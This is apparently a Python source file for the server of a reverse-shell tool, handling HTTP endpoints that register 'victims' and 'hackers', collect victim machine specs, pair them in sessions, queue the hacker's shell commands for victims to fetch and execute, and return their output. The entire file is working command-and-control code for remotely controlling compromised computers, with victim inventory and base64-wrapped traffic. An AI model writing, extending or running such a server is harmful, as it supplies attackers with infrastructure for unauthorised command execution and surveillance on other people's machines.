""" The reverse shell server and request handler. """

# ---- imports
import sqlite3 as sq
import threading as th
import time as tm
from binascii import Error as b64decodeError
from dataclasses import dataclass
from http import HTTPMethod, HTTPStatus
from http.server import BaseHTTPRequestHandler
from typing import Literal, Optional

import typ.json as js

import reverse_shell.server.config as cfg
import reverse_shell.server.database as db
from reverse_shell.server.server_commands import (
    ServerCommands,
    ServerCommandPrivilege as SCP,
)
import reverse_shell.server.sessions as ss
import reverse_shell.utils as ut


# ---- Dataclasses used for type safe json serialization
@dataclass
class VictimInfo:
    host_name: Optional[str]
    os: Optional[str]
    arch: Optional[str]
    ram: Optional[str]
    clock_speed: Optional[str]


# Unfortunately I couldn't find a way to turn TypedDicts definitions to
# dataclasses so we'll be duplicating those we defined in the server_helper
@dataclass
class Output:
    stdout: str
    stderr: str


@dataclass
class PostResJsonBody:
    session_id: str
    response: Output
    empty: bool
    command_status_code: Optional[int]
    failed_to_execute: bool


@dataclass
class PostCmdJsonBody:
    session_id: str
    command: str
    empty: bool


# TODO(extra): override the log_request method to do custom and useful log.
class ZrevshellServer(BaseHTTPRequestHandler):
    """Request handling."""

    def __init__(
        self,
        config: cfg.Config,
        session_manager: ss.SessionManager,
        database: db.Database,
        *args,
        **kwargs,
    ):
        # ---- Our configuration: tokens, ip, port and etc...
        self.config = config
        self.database = database

        # ---- Our session manager
        self.session_manager = session_manager

        # ---- Defining the server_commands
        # Endpoints obtained from the config
        endpoints = self.config.server_cmd_endpoints

        self.server_commands: ServerCommands = (
            ServerCommands.Builder()
            # ---- Register
            .add_command(
                cmd_name=ut.ServerCommand.register,
                command_handler=self.handle_cmd_register,
                endpoint=endpoints[ut.ServerCommand.register],
                http_method=HTTPMethod.POST,
                privilege=SCP.for_all,
            )
            # ---- Hacker Commands
            .add_command(
                cmd_name=ut.ServerCommand.post_cmd,
                command_handler=self.handle_cmd_post_cmd,
                endpoint=endpoints[ut.ServerCommand.post_cmd],
                http_method=HTTPMethod.POST,
                privilege=SCP.hacker_level,
            )
            .add_command(
                cmd_name=ut.ServerCommand.fetch_res,
                command_handler=self.handle_cmd_fetch_res,
                endpoint=endpoints[ut.ServerCommand.fetch_res],
                http_method=HTTPMethod.GET,
                privilege=SCP.hacker_level,
            )
            .add_command(
                cmd_name=ut.ServerCommand.delete_hacker,
                command_handler=self.handle_cmd_delete_hacker,
                endpoint=endpoints[ut.ServerCommand.delete_hacker],
                http_method=HTTPMethod.DELETE,
                privilege=SCP.hacker_level,
            )
            .add_command(
                cmd_name=ut.ServerCommand.list_victims,
                command_handler=self.handle_cmd_list_victims,
                endpoint=endpoints[ut.ServerCommand.list_victims],
                http_method=HTTPMethod.GET,
                privilege=SCP.hacker_level,
            )
            .add_command(
                cmd_name=ut.ServerCommand.exit_session,
                command_handler=self.handle_cmd_exit_session,
                endpoint=endpoints[ut.ServerCommand.exit_session],
                http_method=HTTPMethod.DELETE,
                privilege=SCP.hacker_level,
            )
            .add_command(
                cmd_name=ut.ServerCommand.create_session,
                command_handler=self.handle_cmd_create_session,
                endpoint=endpoints[ut.ServerCommand.create_session],
                http_method=HTTPMethod.POST,
                privilege=SCP.hacker_level,
            )
            # ---- Victim commands
            .add_command(
                cmd_name=ut.ServerCommand.get_session,
                command_handler=self.handle_cmd_get_session,
                endpoint=endpoints[ut.ServerCommand.get_session],
                http_method=HTTPMethod.GET,
                privilege=SCP.victim_level,
            )
            .add_command(
                cmd_name=ut.ServerCommand.fetch_cmd,
                command_handler=self.handle_cmd_fetch_cmd,
                endpoint=endpoints[ut.ServerCommand.fetch_cmd],
                http_method=HTTPMethod.GET,
                privilege=SCP.victim_level,
            )
            .add_command(
                cmd_name=ut.ServerCommand.post_res,
                command_handler=self.handle_cmd_post_res,
                endpoint=endpoints[ut.ServerCommand.post_res],
                http_method=HTTPMethod.POST,
                privilege=SCP.victim_level,
            )
            .build()
        )

        # Initializing our parent, cuz of respect.
        super().__init__(*args, **kwargs)

    # ----------Utility methods ---------- #

    def c_send_error(self, code: HTTPStatus):
        """A function that sends status_codes and ends headers, useful if the error code is the only error to be sent."""
        self.send_response(code)
        self.end_headers()

    def check_verified_request(self) -> bool:
        """Checks if the request is verified by ensuring the existence and validity of auth_token
        and existence of the client-id header"""

        client_id = self.headers.get(
            "client-id"
        )  # This might be None if the client_id doesn't exist
        auth_token = self.headers.get("Authorization")  # same goes here

        # If the client_id header doesn't exist then we tell the user
        # that he is sending a bad request
        if client_id is None or client_id.strip() == "":
            self.c_send_error(HTTPStatus.BAD_REQUEST)
            return False

        if auth_token is not None:
            # Let's check if the auth_token matches ours
            # First let's decode the token, it might not be valid
            # base64 so we'll error handle it.
            try:
                # Remove the Basic string from the token
                auth_token = auth_token.removeprefix("Basic").strip()
                decoded_token = ut.decode_token(auth_token)
            except (b64decodeError, UnicodeDecodeError):
                pass
            else:
                if decoded_token == self.config.auth_token:
                    return True

        # Well if the user doesn't pass through the above it means the client ain't
        # verified so let's inform that to the client.
        self.c_send_error(HTTPStatus.UNAUTHORIZED)
        return False

    def get_client_type_from_db(self, client_id: str) -> Optional[ut.ClientType]:
        """Gets the client type of a specified client from the database and return `None` if not found.
        This could also be a means to check if the client has verified itself.
        Since there could be no client that is verified but has not registered itself.
        """
        # query data from the database
        usr_client_type = self.database.query(
            "SELECT client_type FROM clients WHERE client_id=?", [client_id]
        )
        # Let's return None if the client is not find in the database or an error occurred
        if usr_client_type is None or len(usr_client_type) == 0:
            return None

        # if it's not let's return the client_type, by flattening out the list and tuple and
        # converting into the client_type thing.
        usr_client_type = usr_client_type[0][0]
        result = [
            client_type
            for client_type in [
                ut.ClientType.hacker,
                ut.ClientType.victim,
            ]
            if usr_client_type == client_type.value.__str__()
        ]
        return ut.ClientType(result[0])

    def get_header_token(
        self, token_name: str, fallback: Optional[str] = None
    ) -> Optional[str]:
        """Gets a header field(token) and return it decoded, use `fallback` if decode error happened and `None` if the header doesn't exist"""
        token: Optional[str] = self.headers.get(token_name, None)

        try:
            if token is not None:
                token = ut.decode_token(token)
            return token
        except (b64decodeError, UnicodeDecodeError):
            return fallback

    def insert_victim_info_db(
        self, victim_id: str, json_str: str
    ) -> Optional[sq.Cursor]:
        """Inserts victims info and specs to the victim_info database. returns `None` if some error happens and the database `Cursor`
        if the operation ran smoothly."""
        try:
            victim_info = js.loads(VictimInfo, json_str)
        except (js.json.decoder.JSONDecodeError, js.JsonError):
            # Incase if the data the user sent is not valid json
            # we are going to set victim_info to None and later on set
            # the columns to null
            victim_info = None

        if victim_info is not None:
            # Insert that to the victims database
            return self.database.execute(
                "INSERT INTO victim_info VALUES(?, ?, ?, ?, ?, ?)",
                [
                    victim_id,
                    victim_info.host_name,
                    victim_info.os,
                    victim_info.arch,
                    victim_info.clock_speed,
                    victim_info.ram,
                ],
            )
        else:
            # Well we couldn't even parse the victim info so let's just
            # insert null everywhere
            return self.database.execute(
                "INSERT INTO victim_info VALUES(?, ?, ?, ?, ?, ?)",
                [victim_id, *[None for _ in range(5)]],
            )

    def get_req_body(self) -> Optional[str]:
        """Decodes and reads the body of the request and returns the parsed response.
        Returns `None` if a decode error occurred."""
        # Get the content length.
        try:
            content_length = int(self.headers.get("content-length", 0))
        except ValueError:
            # Incase the content-length header was not a number
            # use 0 as the default
            content_length = 0

        # Get the request body in bytes
        raw_data = self.rfile.read(content_length)

        # Now we expect that the data returned to be base64 encoded
        # let's try to decoded it and return None if not.
        try:
            decoded_data = ut.decode_token(raw_data.decode())
        except (UnicodeDecodeError, b64decodeError):
            decoded_data = None

        return decoded_data

    def get_client_status(self, client_id: str) -> Optional[int]:
        """Retrieve the current client status from the database"""
        result: Optional[list[tuple[int]]] = self.database.query(
            "SELECT status FROM clients WHERE client_id=?", (client_id,)
        )
        # if an error happened our response will be None
        if result is None or len(result) == 0:
            return None
        # Return the status.
        return result[0][0]

    def validate_session(
        self, client_id: str, client_type: ut.ClientType, requested_session_id: str
    ) -> ut.HandlerResponse:
        """Validate the requested session with the session_id the client is actually in.
        Returns a `HandlerResponse` object that can be returned from the command handler methods.
        """

        # Very simple we'll check one condition that's
        # if the requested_session_id and the real_session_id match
        real_session_id = self.session_manager.get_session_id(client_id)

        # This includes all cases this works even if the client requesting
        # is not in a session. Because when it isn't the real_session_id becomes
        # None and therefore will not match to requested_session
        if real_session_id != requested_session_id or real_session_id is None:
            return ut.HandlerResponse(False, HTTPStatus.NOT_ACCEPTABLE)

        # We also need to check if the session requested is not a dead session
        # in other words if the hacker didn't exit the session.
        if not self.session_manager.check_session_alive(requested_session_id):
            if client_type == ut.ClientType.hacker:
                return ut.HandlerResponse(False, HTTPStatus.NOT_ACCEPTABLE)
            elif client_type == ut.ClientType.victim:
                return ut.HandlerResponse(False, HTTPStatus.GONE)

        # Now if the session is alive and return responses for that
        # we'll use the session_id, real_session_id, to fetch the session
        # and check the status of the other client in that session
        real_session = self.session_manager.get_session(real_session_id)

        # Fixed client mis match
        dict_key: Literal["hacker_id", "victim_id"] = "hacker_id"
        if client_type == ut.ClientType.hacker:
            dict_key = "victim_id"

        spouse_client_id = real_session[dict_key]
        if spouse_client_id is None:
            # We don't know what to do, the client has become
            # None without the session being dead so let's raise
            # an error
            raise Exception(
                f"Unexpected 'None' value from a client in an alive session: {real_session_id}"
            )
        # Check the status of the client
        if self.get_client_status(spouse_client_id) == 0:
            # The client has become offline so we need to inform
            # the other user by the GONE error
            return ut.HandlerResponse(False, HTTPStatus.GONE)

        return ut.HandlerResponse(True, HTTPStatus.OK)

    # ---------- Server command handler methods ---------- #

    def handle_cmd_list_victims(
        self, client_id: str, client_type: ut.ClientType, req_body: str | None
    ):
        """Handles the 'list_victims' command that allows a hacker to list victims with their information(specs)."""
        # Ok so this is going to be simple, open the database, read all the clients and
        # return them.
        # TODO: Making the result filterable

        victims = self.database.query(
            "SELECT victim_info.*, clients.status FROM victim_info LEFT JOIN clients ON victim_info.id=clients.client_id"
        )

        if victims is None:
            # Some error must have occurred let's simply report it
            # as an internal server error
            return ut.HandlerResponse(False, HTTPStatus.INTERNAL_SERVER_ERROR)

        # Now change the data into a dictionary, stringify it and send it
        victims = js.dumps(
            [
                {
                    "client_id": victim_info[0],
                    "host_name": victim_info[1],
                    "os": victim_info[2],
                    "arch": victim_info[3],
                    "cpu": victim_info[4],
                    "ram": victim_info[5],
                    "status": victim_info[6],
                }
                for victim_info in victims
                if not self.session_manager.check_client_in_session(
                    victim_info[0]
                )  # Means filtering the ones that are currently in a session out
            ]
        )

        # Now let's package and send the data
        victims = ut.encode_token(victims).encode()

        return ut.HandlerResponse(
            True,
            HTTPStatus.OK,
            victims,
            {"content-length": str(len(victims)), "content-type": "application/json"},
        )

    def handle_cmd_exit_session(
        self, client_id: str, client_type: ut.ClientType, req_body: str | None
    ):
        """Handles the exit_session that allows hackers to dismiss a session with a victim.
        The victim will be also notified and will hop out of the session."""
        # Ok we're going to follow procedures as they do
        # in other session using commands
        session_id = req_body

        if session_id is None or session_id == "":
            return ut.HandlerResponse(False, HTTPStatus.BAD_REQUEST)

        # Now validate the session
        response = self.validate_session(client_id, client_type, session_id)
        if not response.successful:
            return response

        # If it is a valid session now let's kill the session
        # And then remove the hacker from the client_list
        # and also change the hacker_id value in the session
        # to None.
        self.session_manager.kill_session(session_id)

        # Respond to the client with an OK
        return ut.HandlerResponse(True, HTTPStatus.OK)

    def handle_cmd_register(
        self, client_id: str, client_type: ut.ClientType, req_body: str | None
    ):
        """Handles the 'register' command that allows clients to be registered(stored in the servers database)."""
        # First let's check if the user is already in the database
        result = self.database.query(
            "SELECT * FROM clients WHERE client_id=?",
            [client_id],
        )
        # If our result is an empty list that means the user is not there and we can
        # proceed, but if there is something in the list returned, the user already exists
        # so we are going to inform that and stop the execution
        if result is not None:
            if len(result) > 0:
                return ut.HandlerResponse(False, HTTPStatus.CONFLICT)

        # If our user is valid then we can maybe add him to the database
        client_insert_op = self.database.execute(
            "INSERT INTO clients VALUES(?, ?, 0.0, 0)", [client_id, client_type.value]
        )

        if client_insert_op is None:
            # Some kinda SQL error happened so let's send a internal server error message
            return ut.HandlerResponse(False, HTTPStatus.INTERNAL_SERVER_ERROR)

        # If the client is a victim then we will require more data from the body and
        # add it to the victim_info database.
        if client_type.__str__() == ut.ClientType.victim.__str__():
            # Let us insert the victim_info in the database after checking if the req_body isn't None
            if req_body is None:
                return ut.HandlerResponse(False, HTTPStatus.BAD_REQUEST)
            self.insert_victim_info_db(client_id, req_body)

        # If all is good return OK
        return ut.HandlerResponse(True, HTTPStatus.OK)

    def handle_cmd_get_session(
        self, client_id: str, client_type: ut.ClientType, req_body: str | None
    ):
        """Handle the get_session command that allows victims to obtain a session_id key if any hacker
        created a session with them."""

        session_id = self.session_manager.get_session_id(client_id)

        if session_id is None:
            # This means the victim is not in a session.
            return ut.HandlerResponse(False, HTTPStatus.NOT_FOUND)

        session_id_bytes = ut.encode_token(session_id).encode()

        return ut.HandlerResponse(
            True,
            HTTPStatus.OK,
            session_id_bytes,
            {"content-length": str(len(session_id_bytes))},
        )

    def handle_cmd_fetch_cmd(
        self, client_id: str, client_type: ut.ClientType, req_body: str | None
    ):
        """Handle fetch_cmd commands that the victim will call in a loop to obtain the latest
        commands that the hacker has sent."""
        session_id = req_body

        # Check if there is no body(session_id) provided if not we need
        # to tell the victim so
        if session_id is None or session_id == "":
            return ut.HandlerResponse(False, HTTPStatus.BAD_REQUEST)

        # Session validation
        response = self.validate_session(client_id, client_type, session_id)
        if response.res_code == HTTPStatus.GONE:
            # That means the session is dead and we need to notify the victim
            # that it is. .i.e send the termination response code and also remove the session.
            self.session_manager.remove_session(session_id)

        if not response.successful:
            return response

        # Ok now we're sure we have an active session let's now
        # send the victim the commands, but if the command is None
        # rather send a response with no_content
        command = self.session_manager.get_command(session_id)

        if command is None:
            return ut.HandlerResponse(False, HTTPStatus.NO_CONTENT)

        # Ok now let's send the command with an OK res code

        # Encoding the command
        command_bytes = ut.encode_token(command).encode()

        return ut.HandlerResponse(
            True,
            HTTPStatus.OK,
            command_bytes,
            {"content-length": str(len(command_bytes))},
        )

    def handle_cmd_fetch_res(
        self, client_id: str, client_type: ut.ClientType, req_body: str | None
    ):
        """Handle the fetch_res command that allows hackers to get the latest responses in
        individual lines with metadata attached.
        """
        # First let's try to read the request body, if it's None or ''
        # report a bad request
        requested_session_id = req_body

        if requested_session_id is None or requested_session_id == "":
            return ut.HandlerResponse(False, HTTPStatus.BAD_REQUEST)

        # Session validation
        validate_session_response = self.validate_session(
            client_id, client_type, requested_session_id
        )
        if not validate_session_response.successful:
            return validate_session_response

        # If all's good let's fetch the response and send it to the hacker
        # with a beautiful OK response code.

        # Before that we need to check the response and if it is an
        # empty response
        raw_response = self.session_manager.get_response(requested_session_id)

        if len(raw_response) == 0:
            # If there was no content
            return ut.HandlerResponse(False, HTTPStatus.NO_CONTENT)

        response = ut.encode_token(js.dumps(raw_response)).encode()

        return ut.HandlerResponse(
            True,
            HTTPStatus.OK,
            response,
            {"content-length": str(len(response)), "content-type": "application/json"},
        )

    def handle_cmd_post_res(
        self, client_id: str, client_type: ut.ClientType, req_body: str | None
    ):
        """Handles the post_res command that allows victims to post their responses to the session
        for hackers to access."""
        # First check if the req_body is None and send an error
        if req_body is None:
            return ut.HandlerResponse(False, HTTPStatus.BAD_REQUEST)

        # Let's try to decode the request's body into json
        try:
            data = js.loads(PostResJsonBody, req_body)
        except (js.json.decoder.JSONDecodeError, js.JsonError):
            return ut.HandlerResponse(False, HTTPStatus.BAD_REQUEST)

        # Session validation
        validate_session_response = self.validate_session(
            client_id, client_type, data.session_id
        )
        if validate_session_response.res_code == HTTPStatus.GONE:
            # That means the session is dead and we need to notify the victim
            # that it is. .i.e send the termination response code and also remove the session.
            self.session_manager.remove_session(data.session_id)

        if not validate_session_response.successful:
            return validate_session_response

        if not data.empty:
            # Ok else, let's send the success code and insert the response in the session
            self.session_manager.insert_response(
                data.session_id,
                data.response.stdout,
                data.response.stderr,
                data.command_status_code,
                data.failed_to_execute,
            )

        return ut.HandlerResponse(True, HTTPStatus.OK)

    def handle_cmd_post_cmd(
        self, client_id: str, client_type: ut.ClientType, req_body: str | None
    ):
        """Handles the 'post_cmd' command that allows hackers to issue a command for the respective victims in
        their sessions to execute."""
        # Bad request return message
        bad_request = ut.HandlerResponse(False, HTTPStatus.BAD_REQUEST)

        # Check if our req_body isn't None
        if req_body is None:
            return bad_request

        try:
            # Let's try to decode this fella
            data = js.loads(PostCmdJsonBody, req_body)
        except (js.json.decoder.JSONDecodeError, js.JsonError):
            # Well if we fail to decode this then we can't proceed
            # so let's return the bad_request as an indicator
            return bad_request

        # Session validation
        response = self.validate_session(client_id, client_type, data.session_id)
        if not response.successful:
            return ut.HandlerResponse(False, HTTPStatus.NOT_ACCEPTABLE)

        if not data.empty:
            # If we are in session with the victim and satisfy all the other requirements
            # we can proceed by inserting the command in the session comm.
            self.session_manager.insert_command(data.session_id, data.command)

        # If all went good, lets once again return the OK response
        return ut.HandlerResponse(True, HTTPStatus.CREATED)

    def handle_cmd_create_session(
        self, client_id: str, client_type: ut.ClientType, req_body: str | None
    ):
        """Handles the 'create_session' command that allows hackers to create sessions
        with victims."""
        # Keep in mind that the req_body in this case is actually the victim_id itself
        # not in json format but plain string.
        victim_id = req_body

        # if no req_body we can't do anything so let's report error
        if victim_id is None:
            return ut.HandlerResponse(False, HTTPStatus.BAD_REQUEST)

        # Let's check if the victim is valid by using the self.get_client_type function
        valid_victim = (
            victim_type := self.get_client_type_from_db(victim_id)
        ) is not None and victim_type == ut.ClientType.victim

        # If the victim is invalid, send a bad request for the user
        if not valid_victim:
            return ut.HandlerResponse(False, HTTPStatus.BAD_REQUEST)

        # Check if the hacker himself is even in another session
        # so he is trying to create multiple sessions with multiple victims
        if (
            self.session_manager.check_client_in_session(victim_id)
            or self.session_manager.check_client_in_session(client_id)
            or self.get_client_status(victim_id) == 0
        ):
            # This means the victim is already in session with another hacker
            # so let's notify the hacker about it by sending a forbidden error
            return ut.HandlerResponse(False, HTTPStatus.FORBIDDEN)

        # If the victim is valid and not already in session with somebody else
        # let's put him in a session with the hacker.
        session_id = self.session_manager.add_session(client_id, victim_id)
        # Encode the session_id with base64 and turn it to bytes
        session_id_bytes = ut.encode_token(session_id).encode("utf8")

        # Finally report the OK message
        return ut.HandlerResponse(
            True,
            HTTPStatus.OK,
            session_id_bytes,
            {"content-length": str(len(session_id_bytes))},
        )

    def handle_cmd_delete_hacker(
        self, client_id: str, client_type: ut.ClientType, req_body: str | None
    ):
        """Lets the hacker delete itself from the server database."""
        # Delete the hacker from the database
        result = self.database.execute(
            "DELETE FROM clients WHERE client_id=?", [client_id]
        )
        if result is None:
            return ut.HandlerResponse(False, HTTPStatus.INTERNAL_SERVER_ERROR)
        return ut.HandlerResponse(True, HTTPStatus.OK)

    def execute_command(
        self,
        client_id: str,
        command: ut.ServerCommand,
        handler_func,
        get_client_type_from_headers: bool = False,
    ):
        """This method is in charge of handling any server command, provided the handler_function which handles the work done for the server command.
        This method will get the body of the request and validate if the client is eligible of accessing the command. The function will send responses with the client when needed either it be an error or not. the handler_function should accept the client_id, client_type and req_body. req_body will be set to None if there is an error parsing the body of the request.
        """
        legit_client = False

        hacker_token = self.get_header_token("hacker-token")

        client_type_has_token: dict[str, bool] = {
            ut.ClientType.hacker.value.__str__(): hacker_token is not None
            and hacker_token == self.config.hacker_token,
            ut.ClientType.victim.value.__str__(): True,
        }

        if get_client_type_from_headers:
            # First get the client_type of the user and check
            # if the user claims match his tokens.

            # This is only done the first time, when verifying. after we will
            # look for the user in the database.

            client_type = self.headers.get("client-type", None)

            if client_type is not None and client_type_has_token.get(
                client_type, False
            ):
                # Turn the client_type to the ut.ClientType
                client_type = ut.ClientType(int(client_type))
                # Let's check if the client is able to access the server command
                if self.server_commands.check_client_verified_for_cmd(
                    command, client_type
                ):
                    legit_client = True

        else:
            # Ok so first let's get the client-type from the database and
            # use that to check if the user can access the path it's accessing
            client_type = self.get_client_type_from_db(client_id)

            # If client type is None it means the user ain't in the database
            # so respond with a not found, since the victim is not found in the
            # database
            if client_type is None:
                self.send_response(HTTPStatus.NOT_FOUND)
                return self.end_headers()

            # Check if the client has needed tokens for it's type
            has_tokens = client_type_has_token[client_type.value.__str__()]

            # if the client_type is None it means there is no client
            # with the client_id we gave so let's tell the user that
            # he made an unauthorized request.
            if (
                client_type is not None
                and self.server_commands.check_client_verified_for_cmd(
                    command, client_type
                )
                and has_tokens
            ):
                legit_client = True

        if not legit_client:
            # It doesn't seem we are authorized
            self.c_send_error(HTTPStatus.UNAUTHORIZED)
            return

        if command != ut.ServerCommand.register:
            # Update the status and last checked time of
            # the client.

            rt = self.database.execute(
                "UPDATE clients SET last_requested=?, status=1 WHERE client_id=?",
                (tm.time(), client_id),
            )
            if rt is None:
                self.c_send_error(HTTPStatus.INTERNAL_SERVER_ERROR)
                return

        # Now let's get the  body of the request according to validate_req_body function
        body = self.get_req_body()

        # Having the request body ready and having a legit client let's execute
        # the handler for the command.
        result: ut.HandlerResponse = handler_func(client_id, client_type, body)

        # Now we will send what the result sends, the result is expected to be
        # HandlerResponse which is easier to maintain.
        self.send_response(result.res_code)
        for header, value in result.headers.items():
            self.send_header(header, value)
        self.end_headers()

        # let's add the body if provided in the
        # response by the handler_func
        if result.body is not None:
            self.wfile.write(result.body)

    # ---------- HTTP request method handler methods ---------- #

    def main_handler(self, method: HTTPMethod):
        """Handle requests."""
        # This is for when accessing the root path. simply send
        # an OK code with a simple html file.
        if self.path == "/":
            data = """
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8" />
                <meta http-equiv="X-UA-Compatible" content="IE=edge" />
                <meta name="viewport" content="width=device-width, initial-scale=1.0" />
                <title>Thank You</title>
            </head>
            <body>
                <h2>Thanks for the visit!</h2>
            </body>
            </html>
            """.encode()

            self.send_response(HTTPStatus.OK)
            self.send_header("content-type", "text/html")
            self.send_header("content-length", f"{len(data)}")
            self.end_headers()
            self.wfile.write(data)
            return

        # Check if the request is valid
        if not self.check_verified_request():
            return

        # Just for the sake of testing the "check_verified_request"
        if self.path == "/verify":
            self.send_response(HTTPStatus.OK)
            self.end_headers()

        # Get the client id
        client_id = self.headers.get("client-id").__str__()

        # the self.path is the command's id in this case
        command = self.server_commands.get_command_by_endpoint(self.path)

        if command is None:
            # The path requested doesn't match the server_cmds so tell the user that using a 404 error
            self.c_send_error(HTTPStatus.NOT_FOUND)
            return

        # Now let's check if the path(command) requested is available in this method
        required_method = self.server_commands.get_command_method(command)
        handler = self.server_commands.get_command_handler(command)

        if required_method != method:
            # If this path(command) is not meant for this particular
            # method, then send a 404
            self.c_send_error(HTTPStatus.NOT_FOUND)
            return

        # ---- Command execution & authorization
        self.execute_command(
            client_id,
            command,
            handler,
            get_client_type_from_headers=(
                True if command == ut.ServerCommand.register else False
            ),
        )

    def do_GET(self):
        """Handle the GET requests."""
        self.main_handler(HTTPMethod.GET)

    def do_POST(self):
        """Handle POST requests."""
        self.main_handler(HTTPMethod.POST)

    def do_DELETE(self):
        """Handle DELETE requests."""
        self.main_handler(HTTPMethod.DELETE)


def check_pulse(database: db.Database, interval: int, stop_event: th.Event):
    """Check the pulse of the clients using the time. The interval determines the time a
    client can stay online without being flagged offline. if stop_event is true it marks
     the end of the thread."""

    while not stop_event.is_set():
        # Read every client from the database and if their
        # time gap is greater than the interval set the time
        clients = database.query(
            "SELECT client_id, last_requested, status FROM clients",
            raise_for_error=True,
        )

        if clients is None:
            # This will probably never happen
            return

        for client_id, last_requested, status in clients:
            if last_requested == 0.0:
                continue

            if (abs(tm.time() - last_requested) > interval) and status == 1:
                # Ok this means the client got himself in a timeout error
                # so let's set the status to 0
                database.execute(
                    "UPDATE clients SET status=0 WHERE client_id=?",
                    (client_id,),
                    raise_for_error=True,
                )

        tm.sleep(3)
